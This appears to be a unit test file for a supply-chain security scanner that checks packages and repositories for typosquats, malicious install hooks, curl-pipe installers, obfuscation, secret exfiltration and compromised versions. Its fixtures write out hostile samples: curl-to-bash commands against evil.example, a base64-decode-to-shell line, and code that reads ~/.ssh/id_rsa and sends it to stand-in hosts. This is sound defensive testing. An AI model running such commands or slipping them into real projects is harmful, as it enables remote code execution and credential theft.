"""Unit tests for scripts/security_scan.py checkers (no network).
Run: python3 -m unittest discover -s tests -p 'test_security_scan.py'"""
import importlib.util
import os
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
spec = importlib.util.spec_from_file_location(
    "security_scan", os.path.join(ROOT, "scripts", "security_scan.py")
)
S = importlib.util.module_from_spec(spec)
spec.loader.exec_module(S)


def findings_of(fn, path, text, *args):
    out = []
    fn(path, text, out, *args)
    return out


class Levenshtein(unittest.TestCase):
    def test_distance(self):
        self.assertEqual(S.levenshtein("requests", "requests"), 0)
        self.assertEqual(S.levenshtein("requests", "reqeusts"), 2)
        self.assertEqual(S.levenshtein("lodash", "lodahs"), 2)
        self.assertEqual(S.levenshtein("axios", "axois"), 2)

    def test_typo_of_classic(self):
        self.assertEqual(S.typo_of("reqeusts", S.POPULAR_PYPI)[0], "requests")
        self.assertIsNone(S.typo_of("requests", S.POPULAR_PYPI))
        self.assertIsNone(S.typo_of("requests-oauthlib", S.POPULAR_PYPI))
        self.assertIsNone(S.typo_of("@types/node", S.POPULAR_NPM))
        self.assertIsNone(S.typo_of("lodash-es", S.POPULAR_NPM))  # prefix of lodash? lodash-es starts with lodash-
        self.assertIsNone(S.typo_of("httpx2", S.POPULAR_PYPI))
        # actual typo
        hit = S.typo_of("reqests", S.POPULAR_PYPI)
        self.assertIsNotNone(hit)
        self.assertEqual(hit[0], "requests")


class InstallScripts(unittest.TestCase):
    def test_husky_is_ignored(self):
        text = '{"scripts": {"prepare": "husky", "postinstall": "husky install"}}'
        self.assertEqual(findings_of(S.check_package_json, "package.json", text), [])

    def test_curl_pipe_postinstall_is_high_or_malicious(self):
        text = '{"scripts": {"postinstall": "curl https://evil.example/x.sh | bash"}}'
        fs = findings_of(S.check_package_json, "package.json", text)
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0]["check"], "install-scripts")
        self.assertIn(fs[0]["severity"], ("high", "malicious"))

    def test_setup_py_cmdclass(self):
        text = "from setuptools.command.install import install\ncmdclass = {'install': C}\n"
        fs = findings_of(S.check_setup_py, "setup.py", text)
        self.assertEqual(fs[0]["check"], "install-scripts")
        self.assertEqual(fs[0]["severity"], "medium")


class CurlPipe(unittest.TestCase):
    def test_dockerfile_pipe(self):
        text = "RUN curl -fsSL https://unknown-host.example/install.sh | sh\n"
        fs = findings_of(S.check_shell_and_docker, "Dockerfile", text)
        self.assertTrue(any(f["check"] == "curl-pipe" for f in fs))
        self.assertTrue(any(f["severity"] in ("medium", "high") for f in fs))

    def test_known_host_is_low_in_readme(self):
        text = "RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"
        fs = findings_of(S.check_shell_and_docker, "README.md", text)
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0]["severity"], "low")

    def test_known_host_in_dockerfile_is_info(self):
        text = "RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"
        fs = findings_of(S.check_shell_and_docker, "Dockerfile", text)
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0]["severity"], "info")


class Obfuscation(unittest.TestCase):
    def test_eval_atob(self):
        text = 'const x = eval(atob("YWxlcnQoMSk="));\n'
        fs = findings_of(S.check_obfuscation, "src/index.js", text)
        self.assertTrue(any(f["check"] == "obfuscation" and f["severity"] == "high" for f in fs))

    def test_skips_dist_bundle(self):
        line = "var a=" + "x" * 600 + ";function(){}"
        fs = findings_of(S.check_obfuscation, "dist/bundle.js", line)
        self.assertEqual(fs, [])

    def test_long_minified_line_in_src(self):
        line = "var a=" + "x;" * 300
        fs = findings_of(S.check_obfuscation, "src/app.js", line)
        self.assertTrue(any(f["check"] == "obfuscation" for f in fs))


class Secrets(unittest.TestCase):
    def test_ssh_plus_unknown_host_is_high(self):
        text = 'open(os.path.expanduser("~/.ssh/id_rsa"))\nrequests.post("https://collector.example/u", data=key)\n'
        fs = findings_of(S.check_secrets_and_network, "src/agent.py", text, set())
        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)

    def test_env_key_to_official_host_is_clean(self):
        text = 'key = os.environ["ALPACA_API_KEY"]\nrequests.get("https://api.alpaca.markets/v2/orders")\n'
        fs = findings_of(S.check_secrets_and_network, "src/client.py", text, {"alpaca.markets", "api.alpaca.markets"})
        self.assertEqual(fs, [])

    def test_seed_prompt(self):
        text = 'wallet = input("Please paste your seed phrase to continue")\n'
        fs = findings_of(S.check_secrets_and_network, "src/wallet.py", text, set())
        self.assertTrue(any(f["check"] == "permissions" and f["severity"] == "high" for f in fs), fs)

    def test_never_paste_seed_is_ignored(self):
        text = 'print("Never paste your seed phrase into this tool.")\n'
        fs = findings_of(S.check_secrets_and_network, "README.md", text, set())
        self.assertFalse(any(f["check"] == "permissions" for f in fs), fs)


class Permissions(unittest.TestCase):
    def test_community_withdraw_without_confirm(self):
        text = "def withdraw(address, amount):\n    return client.withdraw(address, amount)\n"
        fs = findings_of(S.check_permissions, "src/tools.py", text, False, "mcp", "crypto")
        self.assertEqual(fs[0]["severity"], "high")

    def test_official_trade_without_confirm_is_low(self):
        text = "def place_order(symbol, qty, side):\n    return api.submit_order(symbol, qty, side)\n"
        fs = findings_of(S.check_permissions, "src/tools.py", text, True, "mcp", "trading-brokers")
        self.assertEqual(fs[0]["severity"], "low")

    def test_python_kwarg_tool_name(self):
        text = 'TOOL = Tool(name="close_all_positions", description="Close everything")\n'
        fs = findings_of(S.check_permissions, "src/tools.py", text, True, "mcp", "trading-brokers")
        self.assertTrue(fs, fs)
        self.assertEqual(fs[0]["severity"], "low")

    def test_confirm_suppresses_trade_flag(self):
        text = "def place_order(symbol, qty, side, confirm=False):\n    if not confirm: return\n"
        fs = findings_of(S.check_permissions, "src/tools.py", text, False, "mcp", "crypto")
        self.assertEqual(fs, [])


class RepoUrl(unittest.TestCase):
    def test_normalize(self):
        a = S.normalize_repo_url("git+https://github.com/Alpacahq/alpaca-mcp-server.git")
        b = S.normalize_repo_url("https://github.com/alpacahq/alpaca-mcp-server/")
        self.assertEqual(a, b)

    def test_mismatch(self):
        fs = []
        S.check_registry_match(
            "https://github.com/alpacahq/alpaca-mcp-server",
            "alpacahq",
            "https://github.com/evil/not-alpaca",
            "",
            ["evil"],
            fs,
            "npm",
        )
        self.assertTrue(any(f["check"] == "repo-mismatch" and f["severity"] == "high" for f in fs), fs)

    def test_matching_repo_no_high(self):
        fs = []
        S.check_registry_match(
            "https://github.com/alpacahq/alpaca-mcp-server",
            "alpacahq",
            "https://github.com/alpacahq/alpaca-mcp-server",
            "",
            ["alpacahq"],
            fs,
            "npm",
        )
        self.assertFalse(any(f["severity"] in ("high", "medium", "malicious") for f in fs), fs)


class Status(unittest.TestCase):
    def test_table(self):
        self.assertEqual(S.status_of([]), "clean")
        self.assertEqual(S.status_of([S.finding("x", "d", "low")]), "clean")
        self.assertEqual(S.status_of([S.finding("x", "d", "info"), S.finding("y", "d", "medium")]), "concerns")
        self.assertEqual(S.status_of([S.finding("x", "d", "high")]), "concerns")
        self.assertEqual(S.status_of([S.finding("x", "d", "malicious"), S.finding("y", "d", "low")]), "malicious")


class Paths(unittest.TestCase):
    def test_skip_and_vendor(self):
        self.assertTrue(S.skip_path("node_modules/foo/index.js"))
        self.assertTrue(S.skip_path("src/app.min.js"))
        self.assertTrue(S.is_vendorish("dist/bundle.js"))
        self.assertFalse(S.skip_path("src/server.ts"))
        self.assertTrue(S.interesting("package.json"))
        self.assertTrue(S.interesting("Dockerfile"))
        self.assertFalse(S.interesting("package-lock.json"))


class ParseRepo(unittest.TestCase):
    def test_plain_and_subpath(self):
        self.assertEqual(
            S.parse_repo("https://github.com/alpacahq/alpaca-mcp-server"),
            ("alpacahq", "alpaca-mcp-server", None, None),
        )
        self.assertEqual(
            S.parse_repo("https://github.com/ComposioHQ/awesome-claude-skills/tree/master/invoice-organizer"),
            ("ComposioHQ", "awesome-claude-skills", "master", "invoice-organizer"),
        )
        self.assertIsNone(S.parse_repo("https://gitlab.com/x/y"))

class Publisher(unittest.TestCase):
    def test_email_and_stem(self):
        self.assertTrue(S.publisher_matches("alpacahq", ["Alpaca <info@alpaca.markets>"]))
        self.assertTrue(S.publisher_matches("OpenBB-finance", ["OpenBB Team <hello@openbb.co>"]))
        self.assertTrue(S.publisher_matches("stefanoamorelli", ["Stefano Amorelli <stefano@amorelli.tech>"]))
        self.assertTrue(S.publisher_matches("XeroAPI", ["rdemarco-xero", "eco-sdk"]))
        self.assertFalse(S.publisher_matches("coinbase", ["dingo0927@126.com"]))


class OsvPolicy(unittest.TestCase):
    def test_compromised_release_not_flagged_for_range(self):
        # axios-style short version list: exact pin matches, a different pin does not
        vuln = {"id": "MAL-2026-2307", "affected": [{"package": {"name": "axios"}, "versions": ["1.14.1"]}]}
        exact, ranges, has_fixed = S.mal_affected(vuln)
        self.assertTrue(len(exact) == 1)
        self.assertFalse(S.pin_is_affected(S.parse_semver("1.7.0"), exact, ranges))
        self.assertTrue(S.pin_is_affected(S.parse_semver("1.14.1"), exact, ranges))

    def test_pypi_project_page_is_not_a_repo(self):
        repo, home, authors = S.repo_from_pypi({
            "info": {"project_url": "https://pypi.org/project/mcp-server-ccxt/", "project_urls": None, "home_page": None, "author": None}
        })
        self.assertEqual(repo, "")
        fs = []
        S.check_registry_match("https://github.com/nayshins/mcp-server-ccxt", "nayshins", repo, home, authors, fs, "PyPI")
        self.assertTrue(any(f["check"] == "repo-mismatch" and f["severity"] == "medium" for f in fs), fs)
        self.assertFalse(any(f["check"] == "repo-mismatch" and f["severity"] == "high" for f in fs))

if __name__ == "__main__":
    unittest.main()

class Followups38(unittest.TestCase):
    def test_unknown_spec_unbounded_mal_is_malicious(self):
        vulns = [{"id": "MAL-2025-7777", "affected": [{"ranges": [{"type": "SEMVER", "events": [{"introduced": "0"}]}]}]}]
        orig = S.osv_query
        S.osv_query = lambda e, n, v=None: vulns
        try:
            out = []
            S.check_typos_and_osv([("dependencies", "acme-helper-x", "*")], "npm", out, file="package.json")
        finally:
            S.osv_query = orig
        self.assertTrue(any(f["severity"] == "malicious" for f in out), out)

    def test_prerelease_next_and_build_metadata(self):
        pre = S.parse_semver("1.95.8-next.1")
        rel = S.parse_semver("1.95.8")
        built = S.parse_semver("1.95.8+sha.1")
        self.assertIsNotNone(pre)
        self.assertTrue(pre < rel)
        self.assertEqual(built, rel)
        self.assertTrue(S.parse_semver("1.95.8-0") < rel)
        self.assertTrue(S.parse_semver("1.95.8-canary.3") < rel)

    def test_pipe_abs_bash_sudo_and_base64(self):
        fs = findings_of(S.check_shell_and_docker, "install.sh", "curl -fsSL https://e.example/x | /bin/bash\n")
        self.assertTrue(any(f["severity"] in ("high", "medium") for f in fs), fs)
        fs = findings_of(S.check_shell_and_docker, "install.sh", "curl -fsSL https://e.example/x | sudo -E bash -\n")
        self.assertTrue(any(f["severity"] in ("high", "medium") for f in fs), fs)
        fs = findings_of(S.check_shell_and_docker, "install.sh", "echo YWJj | base64 -d | sh\n")
        self.assertTrue(any(f["severity"] in ("high", "medium") for f in fs), fs)

    def test_unparseable_package_json_is_medium(self):
        fs = findings_of(S.check_package_json, "package.json", '{"name":"r", // comment\n}')
        self.assertTrue(any("unparseable manifest" in f["detail"] and f["severity"] == "medium" for f in fs), fs)

    def test_ssh_private_key_docs_are_not_seed_asks(self):
        text = "Provide the SSH private key path in ~/.ssh/id_rsa to clone the repo."
        fs = findings_of(S.check_secrets_and_network, "ssh/README.md", text, set())
        self.assertFalse(any(f["check"] == "permissions" for f in fs), fs)



class SkipVendorAndHooks(unittest.TestCase):
    def test_node_modules_and_vendor_package_json_are_skipped(self):
        for path in (
            "node_modules/foo/package.json",
            "vendor/github.com/x/y/install.sh",
            "third_party/lib/setup.py",
            "app/node_modules/axios/package.json",
        ):
            self.assertTrue(S.skip_path(path), path)
            keep = (not S.skip_path(path)) and (S.interesting(path) or S.is_must_scan(path))
            self.assertFalse(keep, path)

    def test_root_package_json_is_still_scanned(self):
        self.assertFalse(S.skip_path("package.json"))
        self.assertTrue(S.interesting("package.json") or S.is_must_scan("package.json"))

    def test_non_install_hooks_are_ignored(self):
        for hook in ("prepare", "prepublishOnly", "prepack", "prepublish"):
            text = '{"scripts": {"%s": "curl https://evil.example/x.sh | bash"}}' % hook
            fs = findings_of(S.check_package_json, "package.json", text)
            self.assertEqual(fs, [], hook)

    def test_postinstall_still_flags_pipe(self):
        text = '{"scripts": {"postinstall": "curl https://evil.example/x.sh | bash"}}'
        fs = findings_of(S.check_package_json, "package.json", text)
        self.assertTrue(any(f["check"] == "install-scripts" for f in fs), fs)


class SecretExfilScope(unittest.TestCase):
    def test_skips_tests_fixtures_and_docs(self):
        text = 'open("/root/.ssh/id_rsa"); fetch("https://8.8.8.8/exfil")\n'
        for path in (
            "tests/test_keys.py",
            "test/fixture.js",
            "fixtures/id_rsa",
            "README.md",
            "docs/security.md",
        ):
            fs = findings_of(S.check_secrets_and_network, path, text, set())
            self.assertFalse(any(f["check"] == "secret-exfil" for f in fs), (path, fs))

    def test_plain_metamask_word_is_not_exfil(self):
        for text in ("metamask", "MetaMask Mobile", "see link.metamask.io for the wallet"):
            self.assertFalse(S.SECRET_PATHS.search(text), text)
            fs = findings_of(S.check_secrets_and_network, "src/index.js", text, set())
            self.assertFalse(any(f["check"] == "secret-exfil" for f in fs), (text, fs))

    def test_real_secret_paths_still_flag(self):
        for text in ('open("~/.metamask/vault")', "wallet.dat", "read ~/.ssh/id_rsa"):
            self.assertTrue(S.SECRET_PATHS.search(text), text)
            fs = findings_of(S.check_secrets_and_network, "src/index.js", text, set())
            self.assertTrue(any(f["check"] == "secret-exfil" for f in fs), (text, fs))

    def test_source_id_rsa_still_flags(self):
        fs = findings_of(S.check_secrets_and_network, "src/keys.js", 'fs.readFileSync("/home/u/.ssh/id_rsa")\n', set())
        self.assertTrue(any(f["check"] == "secret-exfil" for f in fs), fs)


class TypoScopeAndNormalize(unittest.TestCase):
    def test_scoped_not_compared_to_unscoped_popular(self):
        for name in (
            "@modelcontextprotocol/server",
            "@dotenvx/dotenvx",
            "@codemirror/view",
            "@playwright/test",
        ):
            self.assertIsNone(S.typo_of(name, S.POPULAR_NPM), name)

    def test_pypi_name_normalization(self):
        self.assertEqual(S.normalize_pkg_name("typing_extensions"), S.normalize_pkg_name("typing-extensions"))
        self.assertIsNone(S.typo_of("typing_extensions", S.POPULAR_PYPI))
        self.assertIsNone(S.typo_of("typing-extensions", S.POPULAR_PYPI))

    def test_unscoped_typo_still_detected(self):
        hit = S.typo_of("reqeusts", S.POPULAR_PYPI)
        self.assertIsNotNone(hit)
        self.assertEqual(hit[0], "requests")


class OfficialInstallerAndMentions(unittest.TestCase):
    def test_official_installers_are_info_outside_readme(self):
        cases = [
            ("install.sh", "curl -LsSf https://astral.sh/uv/install.sh | sh\n"),
            ("setup.sh", "curl -fsSL https://claude.ai/install.sh | bash\n"),
            ("Dockerfile", "RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y\n"),
        ]
        for path, text in cases:
            fs = findings_of(S.check_shell_and_docker, path, text)
            self.assertTrue(fs, (path, text))
            self.assertEqual({f["severity"] for f in fs}, {"info"}, (path, fs))

    def test_readme_nodesource_stays_low(self):
        text = "curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"
        fs = findings_of(S.check_shell_and_docker, "README.md", text)
        self.assertEqual({f["severity"] for f in fs}, {"low"}, fs)

    def test_ci_workflow_is_info(self):
        text = 'run: curl -fsSL https://claude.ai/install.sh | bash\n'
        fs = findings_of(S.check_shell_and_docker, ".github/workflows/ci.yml", text)
        self.assertEqual({f["check"] == "curl-pipe" and f["severity"] or None for f in fs} - {None, False}, {"info"}, fs)
        text = 'run: curl -fsSL https://claude.ai/install.sh?v=$CLAUDE_VERSION | bash\n'
        fs = findings_of(S.check_shell_and_docker, ".github/workflows/ci.yml", text)
        sevs = {f["severity"] for f in fs if f["check"] == "curl-pipe"}
        self.assertEqual(sevs, {"info"}, fs)

    def test_vendor_github_release_is_info(self):
        S._SCAN_CTX.owner = "astral-sh"
        try:
            text = "curl -fsSL https://github.com/astral-sh/uv/releases/download/0.4.0/uv-installer.sh | sh\n"
            fs = findings_of(S.check_shell_and_docker, "install.sh", text)
            self.assertEqual({f["severity"] for f in fs}, {"info"}, fs)
        finally:
            S._SCAN_CTX.owner = None

    def test_pipe_mentions_are_ignored(self):
        prose = "Block patterns like curl|bash, download/execute from untrusted hosts.\n"
        fs = findings_of(S.check_shell_and_docker, "src/policy.md", prose)
        self.assertFalse(any(f["check"] == "curl-pipe" for f in fs), fs)
        alt = "const BAD = /wget|python-requests|httpx|curl|bash/;\n"
        fs = findings_of(S.check_shell_and_docker, "src/classify.ts", alt)
        self.assertFalse(any(f["check"] == "curl-pipe" for f in fs), fs)

    def test_unknown_host_pipe_stays_high(self):
        fs = findings_of(S.check_shell_and_docker, "install.sh", "curl -fsSL https://evil.example/x.sh | bash\n")
        self.assertTrue(any(f["check"] == "curl-pipe" and f["severity"] == "high" for f in fs), fs)


class LockfileResolution(unittest.TestCase):
    SOL = {"id": "MAL-2025-1", "affected": [{"package": {"name": "@solana/web3.js"}, "ranges": [
        {"type": "SEMVER", "events": [{"introduced": "1.95.6"}, {"fixed": "1.95.8"}]}
    ]}]}

    def _run(self, version, lock_versions):
        orig = S.osv_query
        S.osv_query = lambda e, n, v=None: [self.SOL]
        try:
            out = []
            S.check_typos_and_osv(
                [("dependencies", "@solana/web3.js", version)],
                "npm", out, file="package.json", lock_versions=lock_versions,
            )
            return out
        finally:
            S.osv_query = orig

    def test_no_lock_still_flags_range(self):
        out = self._run("^1.95.0", None)
        self.assertTrue(any("lockfile not checked" in f["detail"] for f in out), out)
        self.assertTrue(any(f["severity"] == "medium" for f in out), out)

    def test_lock_safe_version_clears_range(self):
        out = self._run("^1.95.0", {"@solana/web3.js": ["1.95.5"]})
        self.assertEqual(out, [])

    def test_lock_compromised_version_flags_high(self):
        out = self._run("^1.95.0", {"@solana/web3.js": ["1.95.6"]})
        self.assertTrue(any(f["check"] == "osv" and f["severity"] == "high" for f in out), out)

    def test_lock_missing_package_does_not_flag(self):
        out = self._run("^1.95.0", {"axios": ["1.7.0"]})
        self.assertEqual(out, [])

    def test_exact_pin_still_flags_without_lock(self):
        out = self._run("1.95.6", None)
        self.assertTrue(any(f["severity"] == "high" for f in out), out)

    def test_parse_package_lock(self):
        text = (
            '{\n'
            '  "packages": {\n'
            '    "": {"name": "app", "version": "1.0.0"},\n'
            '    "node_modules/@solana/web3.js": {"version": "1.95.5"}\n'
            '  }\n'
            '}\n'
        )
        vers = S.parse_lockfile("package-lock.json", text)
        self.assertIn("1.95.5", vers.get("@solana/web3.js") or [])

    def test_parse_yarn_pnpm_poetry_uv(self):
        yarn = S.parse_lockfile("yarn.lock", '"@solana/web3.js@^1.95.0":\n  version "1.95.5"\n')
        self.assertIn("1.95.5", yarn.get("@solana/web3.js") or [])
        pnpm = S.parse_lockfile("pnpm-lock.yaml", "  /@solana/web3.js@1.95.5:\n    resolution: {}\n")
        self.assertIn("1.95.5", pnpm.get("@solana/web3.js") or [])
        poetry = S.parse_lockfile("poetry.lock", 'name = "requests"\nversion = "2.28.0"\n')
        self.assertIn("2.28.0", poetry.get("requests") or [])
        uv = S.parse_lockfile("uv.lock", 'name = "typing-extensions"\nversion = "4.12.0"\n')
        self.assertIn("4.12.0", uv.get("typing-extensions") or [])
        self.assertTrue(S.resolved_lock_versions(uv, "typing_extensions"))

    def test_lock_versions_walk_up_tree(self):
        locks = {"": {"axios": ["1.7.0"]}}
        self.assertEqual(S.lock_versions_for("packages/foo/package.json", locks), {"axios": ["1.7.0"]})
        self.assertIsNone(S.lock_versions_for("package.json", {}))


class PartialAndTimeout(unittest.TestCase):
    def test_capped_clean_scan_is_partial(self):
        out = S.finalize_status({"fetch_failed": []}, [], truncated=True)
        self.assertEqual(out["status"], "partial")
        self.assertTrue(out["truncated"])

    def test_hard_failure_stays_incomplete(self):
        fs = [S.finding("repo", "repository is not reachable", "info")]
        out = S.finalize_status({"fetch_failed": []}, fs, incomplete=True)
        self.assertEqual(out["status"], "incomplete")

    def test_fetch_failed_is_incomplete(self):
        out = S.finalize_status({"fetch_failed": ["package.json"]}, [], truncated=False, incomplete=True)
        self.assertEqual(out["status"], "incomplete")

    def test_medium_finding_stays_concerns_when_truncated(self):
        fs = [S.finding("osv", "range admits a compromised release", "medium")]
        out = S.finalize_status({"fetch_failed": []}, fs, truncated=True)
        self.assertEqual(out["status"], "concerns")

    def test_timeout_cli_flag(self):
        only, dry, out_dir, jobs, max_files, timeout = S.parse_args(
            ["--only=firefly-iii-api", "--timeout=600", "--jobs=1"], {"firefly-iii-api"}
        )
        self.assertEqual(timeout, 600)
        self.assertEqual(only, ["firefly-iii-api"])
        self.assertEqual(jobs, 1)
